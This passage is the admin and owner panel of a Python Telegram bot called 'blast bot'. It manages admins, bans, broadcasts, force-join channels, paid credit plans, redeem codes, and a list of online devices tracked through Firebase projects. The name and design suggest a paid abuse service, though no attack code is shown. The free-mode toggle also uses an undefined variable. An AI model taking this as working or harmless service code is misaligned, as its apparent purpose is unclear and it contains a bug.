        f"{em(EMOJI_CROWN, '👑')} <b>Add Super Admin</b>\n\nSuper Admin Chat ID bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:owners:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_owner)
async def owner_owners_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        new_id = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid Chat ID bhejo.", parse_mode="HTML")
        return
    if is_owner(new_id, d):
        await state.clear()
        await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} Already super admin!", reply_markup=owners_menu_kb(d), parse_mode="HTML")
        return
    if len(d.get("owners", [])) >= 6:
        await state.clear()
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Max 6!", reply_markup=owners_menu_kb(d), parse_mode="HTML")
        return
    d["owners"].append(new_id)
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Super Admin Added!</b>\n<code>{new_id}</code>",
        reply_markup=owners_menu_kb(load()),
        parse_mode="HTML"
    )
    try:
        await msg.bot.send_message(new_id, f"{em(EMOJI_CROWN, '🔱')} <b>Aapko Super Admin bana diya gaya!</b>\n/start karein.", parse_mode="HTML")
    except: pass

@R.callback_query(F.data.startswith("owner:owners:del:"))
async def owner_owners_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    del_id = int(cq.data.split("owner:owners:del:", 1)[1])
    if not is_owner(uid, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    if del_id == MAIN_OWNER or del_id in SUPER_ADMINS:
        await cq.answer("❌ Main owner / Hardcoded Super Admin remove nahi ho sakta!", show_alert=True)
        return
    if del_id in d["owners"]:
        d["owners"].remove(del_id)
        save(d)
        await cq.answer("🗑 Removed!")
    await cq.message.edit_text(
        f"{em(EMOJI_CROWN, '👑')} <b>Owners</b>\n\nTotal: <b>{len(d['owners'])}/6</b>",
        reply_markup=owners_menu_kb(d),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:admins:menu")
async def owner_admins_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    admins = d.get("admins", [])
    await cq.message.edit_text(
        f"{em(EMOJI_SHIELD, '🛡')} <b>Admins</b>\n\nTotal: <b>{len(admins)}</b>",
        reply_markup=admins_menu_kb(d),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:admins:add")
async def owner_admins_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_admin)
    await cq.message.edit_text(
        f"{em(EMOJI_SHIELD, '🛡')} <b>Add Admin</b>\n\nTelegram User ID bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:admins:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_admin)
async def owner_admins_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        new_id = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID bhejo.", parse_mode="HTML")
        return
    if new_id in d.get("admins", []) or is_owner(new_id, d):
        await state.clear()
        await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} Already admin/owner!", reply_markup=admins_menu_kb(d), parse_mode="HTML")
        return
    d["admins"].append(new_id)
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Admin Added!</b>\n<code>{new_id}</code>",
        reply_markup=admins_menu_kb(load()),
        parse_mode="HTML"
    )
    try:
        await msg.bot.send_message(new_id, f"{em(EMOJI_SHIELD, '🛡')} <b>Aapko Admin bana diya gaya!</b>\n/start karein.", parse_mode="HTML")
    except: pass

@R.callback_query(F.data.startswith("owner:admins:del:"))
async def owner_admins_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    del_id = int(cq.data.split("owner:admins:del:", 1)[1])
    if not is_owner(uid, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    if del_id in d.get("admins", []):
        d["admins"].remove(del_id)
        save(d)
        await cq.answer("🗑 Removed!")
    await cq.message.edit_text(
        f"{em(EMOJI_SHIELD, '🛡')} <b>Admins</b>\n\nTotal: <b>{len(d['admins'])}</b>",
        reply_markup=admins_menu_kb(d),
        parse_mode="HTML"
    )

@R.callback_query(F.data.in_({"owner:free:on", "owner:free:off"}))
async def owner_free_toggle(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    d["free_mode"] = (cq.data == "owner:free:on")
    save(d)
    d = load()
    mode = "🟢 FREE MODE ON" if d["free_mode"] else "🔴 Approval Required"
    await cq.answer(f"Done! {mode}", show_alert=True)
    try:
        await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d, uid), parse_mode="HTML")
    except TelegramBadRequest: pass

@R.callback_query(F.data.in_({"owner:users:list", "admin:users:list"}))
async def panel_users_list(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    prefix = "owner" if is_owner(uid, d) else "admin"
    if not is_admin(uid, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    text, markup = users_list_kb(d, prefix, 0)
    await cq.message.edit_text(text, reply_markup=markup, parse_mode="HTML")

@R.callback_query(F.data.regexp(r"^(owner|admin):users:pg:(\d+)$"))
async def panel_users_page(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    parts = cq.data.split(":")
    prefix = parts[0]
    page = int(parts[3])
    text, markup = users_list_kb(d, prefix, page)
    await cq.message.edit_text(text, reply_markup=markup, parse_mode="HTML")

@R.callback_query(F.data.in_({"owner:ban", "admin:ban"}))
async def panel_ban_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    await state.update_data(reseller_action=False)
    await state.set_state(S.ban_user)
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    await cq.message.edit_text(
        f"{em(EMOJI_CROSS, '🚫')} <b>Ban User</b>\n\nUser ka Telegram ID bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", back)]),
        parse_mode="HTML"
    )

@R.message(S.ban_user)
async def panel_ban_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    fsm_data = await state.get_data()
    reseller_action = bool(fsm_data.get("reseller_action"))
    if reseller_action:
        if not is_reseller(uid, d):
            await state.clear(); return
    elif not is_admin(uid, d):
        await state.clear()
        return
    try:
        ban_id = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID bhejo.", parse_mode="HTML")
        return
    if is_privileged_target(ban_id, d):
        await state.clear()
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Owner/Admin/Reseller ko ban nahi kar sakte!", parse_mode="HTML")
        return
    if ban_id not in d.get("banned", []):
        d.setdefault("banned", []).append(ban_id)
        save(d)
    await state.clear()
    back_kb = owner_kb(d, uid) if is_owner(uid, d) else reseller_kb(d) if reseller_action else admin_kb(d)
    await msg.answer(
        f"{em(EMOJI_CROSS, '🚫')} <b>Ban ho gaya!</b>\n<code>{ban_id}</code>",
        reply_markup=back_kb,
        parse_mode="HTML"
    )
    try:
        await msg.bot.send_message(ban_id, f"{em(EMOJI_CROSS, '🚫')} Aapko ban kar diya gaya. Admin se contact karein.", parse_mode="HTML")
    except: pass

@R.callback_query(F.data.in_({"owner:unban:menu", "admin:unban:menu"}))
async def panel_unban_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    banned = d.get("banned", [])
    if not banned:
        await cq.answer("✅ Koi banned nahi!", show_alert=True)
        return
    prefix = "owner" if is_owner(cq.from_user.id, d) else "admin"
    await cq.message.edit_text(
        f"{em(EMOJI_CHECK, '🔓')} <b>Unban User</b>\n\nBanned: <b>{len(banned)}</b>",
        reply_markup=unban_menu_kb(d, prefix),
        parse_mode="HTML"
    )

@R.callback_query(F.data.regexp(r"^(owner|admin):unban:do:(\d+)$"))
async def panel_unban_do(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    ban_id = int(cq.data.split(":")[-1])
    if ban_id in d.get("banned", []):
        d["banned"].remove(ban_id)
        save(d)
    await cq.answer(f"✅ {ban_id} unban ho gaya!", show_alert=True)
    back_text = owner_panel_text(d) if is_owner(uid, d) else admin_panel_text(d)
    back_kb = owner_kb(d, uid) if is_owner(uid, d) else admin_kb(d)
    await cq.message.edit_text(back_text, reply_markup=back_kb, parse_mode="HTML")
    try:
        await cq.bot.send_message(ban_id, f"{em(EMOJI_CHECK, '✅')} Aapka ban hata diya gaya. /start karein.", parse_mode="HTML")
    except: pass

@R.callback_query(F.data.in_({"owner:broadcast", "admin:broadcast"}))
async def panel_broadcast_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    await state.set_state(S.broadcast)
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    await cq.message.edit_text(
        f"{em(EMOJI_BELL, '📢')} <b>Broadcast</b>\n\nJo message bhejni hai woh type karo:",
        reply_markup=kb([(f"{sc('cancel')}", back)]),
        parse_mode="HTML"
    )

@R.message(S.broadcast)
async def panel_broadcast_do(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_admin(uid, d):
        await state.clear()
        return
    await state.clear()
    users = d.get("users", {})
    wait = await msg.answer(f"{em(EMOJI_BELL, '📤')} Broadcasting to <b>{len(users)}</b> users...", parse_mode="HTML")
    ok = 0
    fail = 0
    for uid_str in users:
        try:
            target = int(uid_str)
            if msg.text:
                bcast_text = f"{em(EMOJI_BELL, '📢')} <b>Broadcast</b>\n\n{msg.text}"
                await msg.bot.send_message(target, bcast_text, parse_mode="HTML")
            else:
                await msg.copy_to(target)
            ok += 1
        except Exception:
            fail += 1
        await asyncio.sleep(0.05)
    await wait.delete()
    back_kb = owner_kb(d, uid) if is_owner(uid, d) else admin_kb(d)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Broadcast Done!</b>\n\n{em(EMOJI_CHECK, '✅')} Delivered: <b>{ok}</b>\n{em(EMOJI_CROSS, '❌')} Failed: <b>{fail}</b>",
        reply_markup=back_kb,
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:export_script")
async def owner_export_script(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await cq.answer("📤 Exporting...")
    try:
        script_path = os.path.abspath(__file__)
        if not os.path.exists(script_path):
            script_path = _DATA_FILE.replace(".json", ".py")
            if not os.path.exists(script_path):
                script_path = "blast_bot_v3.2_premium.py"
        await cq.message.reply_document(
            document=FSInputFile(script_path),
            caption=f"{em(EMOJI_GEAR, '📤')} <b>Script Export</b> — <i>{_VERSION}</i>",
            parse_mode="HTML"
        )
    except Exception as e:
        await cq.answer(f"❌ Export failed: {str(e)[:40]}", show_alert=True)

@R.callback_query(F.data.in_({"admin:home", "admin:refresh"}))
async def admin_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Admin Only!", show_alert=True)
        return
    try:
        await cq.message.edit_text(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
    except TelegramBadRequest: pass

@R.callback_query(F.data == "admin:stats")
async def admin_stats_cb(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Admin Only!", show_alert=True)
        return
    await cq.answer("⏳ Fetching...")

    current_fb_ids = {fb["id"] for fb in d.get("firebases", [])}
    global CACHED_DEVICES, FB_DEVICE_COUNTS
    CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") in current_fb_ids]
    stale = [k for k in FB_DEVICE_COUNTS if k not in current_fb_ids]
    for k in stale:
        FB_DEVICE_COUNTS.pop(k, None)

    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(d)

    stats_text = api_stats_text(d)
    dev_lines = [f"\n{em(EMOJI_CHECK, '🟢')} <b>Online Devices ({len(devices)})</b>\n"]
    if not devices:
        dev_lines.append(f"  {em(EMOJI_WARNING, '😴')} Koi device online nahi")
    for dv in devices:
        dev_lines.append(f"  {em(EMOJI_PHONE, '📱')} <b>{dv['dev_name'][:20]}</b> — {em(EMOJI_FIRE, '🔥')} {dv['fb_label'][:20]}")
    full = stats_text + "\n" + "\n".join(dev_lines)

    if len(full) > 4000:
        full = full[:3990] + "\n<i>...truncated</i>"

    await cq.message.edit_text(
        full,
        reply_markup=kb([
            (f"{sc('refresh')}", "admin:stats"),
            (f"{sc('back')}", "admin:home")
        ]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:fj:menu")
async def owner_fj_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    fj = d.get("force_join", {})
    channels = fj.get("channels", [])
    status = f"{em(EMOJI_CHECK, '🟢')} ON" if fj.get("enabled") else f"{em(EMOJI_CROSS, '🔴')} OFF"

    text = f"{em(EMOJI_BELL, '🔗')} <b>Force Join Settings</b>\n\nStatus: {status}\nChannels: <b>{len(channels)}</b>\n\n"
    for ch in channels:
        req = f"{em(EMOJI_CHECK, '✅')} Required" if ch.get("required", True) else f"{em(EMOJI_CROSS, '❌')} Optional"
        text += f"• {ch.get('title', 'Channel')} (<code>{ch['id']}</code>)\n  {req} | {ch['link']}\n\n"

    rows = [
        [btn("ᴀᴅᴅ ᴄʜᴀɴɴᴇʟ", "owner:fj:add", EMOJI_CHECK, "➕")],
        [btn("ʀᴇᴍᴏᴠᴇ ᴄʜᴀɴɴᴇʟ", "owner:fj:remove", EMOJI_CROSS, "🗑")],
        [InlineKeyboardButton(
            text=f"🟢 {sc('enable')}" if not fj.get("enabled") else f"🔴 {sc('disable')}",
            callback_data="owner:fj:toggle"
        )],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:fj:add")
async def owner_fj_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.fj_add_channel)
    await cq.message.edit_text(
        f"{em(EMOJI_BELL, '🔗')} <b>Add Force Join Channel</b>\n\n"
        f"{sc('step 1/2')}: Channel/Group ka Telegram ID bhejo:\n"
        f"<i>Example: -1001234567890</i>\n\n"
        f"<b>Note:</b> Bot ko us channel/group mein admin hona chahiye.",
        reply_markup=kb([(f"{sc('cancel')}", "owner:fj:menu")]),
        parse_mode="HTML"
    )

@R.message(S.fj_add_channel)
async def owner_fj_add_channel(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        ch_id = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid channel ID bhejo (numbers only, e.g. -100xxx).", parse_mode="HTML")
        return
    await state.update_data(fj_channel_id=ch_id)
    await state.set_state(S.fj_add_link)
    await msg.answer(
        f"{em(EMOJI_BELL, '🔗')} <b>{sc('step 2/2')}</b>\n\n"
        f"Channel/Group ka invite link bhejo:\n"
        f"<i>Example: https://t.me/+AbCdEfGhIjK</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:fj:menu")]),
        parse_mode="HTML"
    )

@R.message(S.fj_add_link)
async def owner_fj_add_link(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    link = msg.text.strip()
    if not link.startswith("http"):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid link bhejo (https:// se start hona chahiye).", parse_mode="HTML")
        return

    fsmd = await state.get_data()
    ch_id = str(fsmd.get("fj_channel_id"))

    try:
        chat = await msg.bot.get_chat(int(ch_id))
        title = chat.title or "Channel"
    except:
        title = "Channel"

    channels = d.setdefault("force_join", {}).setdefault("channels", [])
    channels = [c for c in channels if str(c["id"]) != ch_id]
    channels.append({"id": ch_id, "link": link, "title": title, "required": True})
    d["force_join"]["channels"] = channels
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Channel Added!</b>\n\n{em(EMOJI_BELL, '📢')} {title}\n{em(EMOJI_GEAR, '🔗')} {link}",
        reply_markup=kb([(f"{sc('back')}", "owner:fj:menu")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:fj:remove")
async def owner_fj_remove_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    channels = d.get("force_join", {}).get("channels", [])
    if not channels:
        await cq.answer("❌ Koi channel nahi hai!", show_alert=True)
        return

    rows = []
    for ch in channels:
        rows.append([btn(f"{ch.get('title', 'Channel')[:25]}", f"owner:fj:del:{ch['id']}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:fj:menu", EMOJI_GEAR, "🔙")])

    await cq.message.edit_text(
        f"{em(EMOJI_CROSS, '🗑')} <b>Remove Channel</b>\n\nKaunsa channel hataana hai?",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
        parse_mode="HTML"
    )

@R.callback_query(F.data.startswith("owner:fj:del:"))
async def owner_fj_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    ch_id = cq.data.split("owner:fj:del:", 1)[1]
    channels = d.get("force_join", {}).get("channels", [])
    d["force_join"]["channels"] = [c for c in channels if str(c["id"]) != ch_id]
    save(d)
    await cq.answer("🗑 Channel removed!")
    await owner_fj_menu(cq, state)

@R.callback_query(F.data == "owner:fj:toggle")
async def owner_fj_toggle(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    fj = d.setdefault("force_join", {})
    fj["enabled"] = not fj.get("enabled", False)
    save(d)
    status = "ENABLED" if fj["enabled"] else "DISABLED"
    await cq.answer(f"Force Join {status}!", show_alert=True)
    await owner_fj_menu(cq, state)

@R.callback_query(F.data == "owner:pricing:menu")
async def owner_pricing_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    plans = d.get("pricing", {}).get("plans", [])

    text = f"{em(EMOJI_MONEY, '💳')} <b>Pricing Plans</b>\n\nTotal Plans: <b>{len(plans)}</b>\n\n"
    for i, plan in enumerate(plans, 1):
        text += f"{i}. <b>{plan['name']}</b>\n   {em(EMOJI_MONEY, '💰')} {plan['price']} {plan.get('currency', 'INR')} = {plan['credits']} credits\n   {em(EMOJI_GEAR, '🔗')} {plan['payment_link']}\n\n"

    rows = [
        [btn("ᴀᴅᴅ ᴘʟᴀɴ", "owner:pricing:add", EMOJI_CHECK, "➕")],
        [btn("ʀᴇᴍᴏᴠᴇ ᴘʟᴀɴ", "owner:pricing:remove", EMOJI_CROSS, "🗑")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:pricing:add")
async def owner_pricing_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_plan_name)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY, '💳')} <b>Add Pricing Plan</b>\n\n{sc('step 1/4')}: Plan ka naam bhejo:\n<i>Example: Basic Plan</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:pricing:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_plan_name)
async def owner_pricing_name(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    await state.update_data(plan_name=msg.text.strip())
    await state.set_state(S.add_plan_price)
    await msg.answer(
        f"{em(EMOJI_MONEY, '💳')} <b>{sc('step 2/4')}</b>\n\nPrice bhejo:\n<i>Example: 50</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:pricing:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_plan_price)
async def owner_pricing_price(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    try:
        price = float(msg.text.strip())
        await state.update_data(plan_price=price)
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid price bhejo (numbers only).", parse_mode="HTML")
        return
    await state.set_state(S.add_plan_credits)
    await msg.answer(
        f"{em(EMOJI_MONEY, '💳')} <b>{sc('step 3/4')}</b>\n\nKitne credits dena hai?\n<i>Example: 100</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:pricing:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_plan_credits)
async def owner_pricing_credits(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    try:
        credits = int(msg.text.strip())
        await state.update_data(plan_credits=credits)
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number bhejo.", parse_mode="HTML")
        return
    await state.set_state(S.add_plan_link)
    await msg.answer(
        f"{em(EMOJI_MONEY, '💳')} <b>{sc('step 4/4')}</b>\n\nPayment redirect link bhejo:\n"
        f"<i>Example: {SUPER_ADMIN_LINK} ya koi payment URL</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:pricing:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_plan_link)
async def owner_pricing_link(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    link = msg.text.strip()
    if not link.startswith("http"):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid URL bhejo (https:// se start hona chahiye).", parse_mode="HTML")
        return

    fsmd = await state.get_data()
    plan = {
        "id": str(int(time.time())),
        "name": fsmd.get("plan_name", "Plan"),
        "price": fsmd.get("plan_price", 0),
        "credits": fsmd.get("plan_credits", 0),
        "currency": "INR",
        "payment_link": link
    }
    d.setdefault("pricing", {}).setdefault("plans", []).append(plan)
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Plan Added!</b>\n\n{em(EMOJI_STAR, '📋')} {plan['name']}\n{em(EMOJI_MONEY, '💰')} {plan['price']} INR = {plan['credits']} credits\n{em(EMOJI_GEAR, '🔗')} {plan['payment_link']}",
        reply_markup=kb([(f"{sc('back')}", "owner:pricing:menu")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:pricing:remove")
async def owner_pricing_remove(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    plans = d.get("pricing", {}).get("plans", [])
    if not plans:
        await cq.answer("❌ Koi plan nahi hai!", show_alert=True)
        return

    rows = []
    for plan in plans:
        rows.append([btn(f"{plan['name'][:25]}", f"owner:pricing:del:{plan['id']}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:pricing:menu", EMOJI_GEAR, "🔙")])

    await cq.message.edit_text(
        f"{em(EMOJI_CROSS, '🗑')} <b>Remove Plan</b>\n\nKaunsa plan hataana hai?",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
        parse_mode="HTML"
    )

@R.callback_query(F.data.startswith("owner:pricing:del:"))
async def owner_pricing_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    plan_id = cq.data.split("owner:pricing:del:", 1)[1]
    plans = d.get("pricing", {}).get("plans", [])
    d["pricing"]["plans"] = [p for p in plans if p["id"] != plan_id]
    save(d)
    await cq.answer("🗑 Plan removed!")
    await owner_pricing_menu(cq, state)

@R.callback_query(F.data == "owner:redeem:menu")
async def owner_redeem_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    codes = d.get("redeem_codes", {})

    text = f"{em(EMOJI_GIFT, '🎁')} <b>Redeem Codes</b>\n\nTotal: <b>{len(codes)}</b>\n\n"
    for code, data in list(codes.items())[:10]:
        status = f"{em(EMOJI_CHECK, '✅')} Active" if data.get("uses_left", 0) > 0 else f"{em(EMOJI_CROSS, '❌')} Expired"
        text += f"<code>{code}</code> — {em(EMOJI_MONEY, '💰')}{data['credits']} — {status} ({data.get('uses_left', 0)} left)\n"

    rows = [
        [btn("ɢᴇɴᴇʀᴀᴛᴇ ᴄᴏᴅᴇ", "owner:redeem:gen", EMOJI_CHECK, "➕")],
        [btn("ᴅᴇʟᴇᴛᴇ ᴄᴏᴅᴇ", "owner:redeem:del", EMOJI_CROSS, "🗑")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:redeem:gen")
async def owner_redeem_gen_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.gen_redeem_credits)
    await cq.message.edit_text(
        f"{em(EMOJI_GIFT, '🎁')} <b>Generate Redeem Code</b>\n\n{sc('step 1/2')}: Kitne credits dena hai?\n<i>Example: 50</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:redeem:menu")]),
        parse_mode="HTML"
    )

@R.message(S.gen_redeem_credits)
async def owner_redeem_credits(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    try:
        credits = int(msg.text.strip())
        await state.update_data(gen_credits=credits)
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number bhejo.", parse_mode="HTML")
        return
    await state.set_state(S.gen_redeem_uses)
    await msg.answer(
        f"{em(EMOJI_GIFT, '🎁')} <b>{sc('step 2/2')}</b>\n\nKitni baar use ho sakta hai?\n<i>Example: 10</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:redeem:menu")]),
        parse_mode="HTML"
    )

@R.message(S.gen_redeem_uses)
async def owner_redeem_uses(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        uses = int(msg.text.strip())
        if uses < 1: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number bhejo (1 ya zyada).", parse_mode="HTML")
        return

    fsmd = await state.get_data()
    credits = fsmd.get("gen_credits", 10)

    while True:
        code = "GIFT" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
        if code not in d.get("redeem_codes", {}):
            break

    d.setdefault("redeem_codes", {})[code] = {
        "credits": credits,
        "uses_left": uses,
        "created_by": msg.from_user.id,
        "created_at": int(time.time()),
        "used_by": []
    }
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_GIFT, '🎉')} <b>Redeem Code Generated!</b>\n\n"
        f"{em(EMOJI_GIFT, '🎁')} Code: <code>{code}</code>\n"
        f"{em(EMOJI_MONEY, '💰')} Credits: <b>{credits}</b>\n"
        f"{em(EMOJI_STAR, '🔢')} Max Uses: <b>{uses}</b>\n\n"
        f"<i>Users is code se redeem karke credits le sakte hain.</i>",
        reply_markup=kb([(f"{sc('back')}", "owner:redeem:menu")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:redeem:del")
async def owner_redeem_del_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    codes = d.get("redeem_codes", {})
    if not codes:
        await cq.answer("❌ Koi code nahi hai!", show_alert=True)
        return

    rows = []
    for code in list(codes.keys())[:20]:
        rows.append([btn(code, f"owner:redeem:deldo:{code}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:redeem:menu", EMOJI_GEAR, "🔙")])

    await cq.message.edit_text(
        f"{em(EMOJI_CROSS, '🗑')} <b>Delete Redeem Code</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
        parse_mode="HTML"
    )

@R.callback_query(F.data.startswith("owner:redeem:deldo:"))
async def owner_redeem_del_do(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    code = cq.data.split("owner:redeem:deldo:", 1)[1]
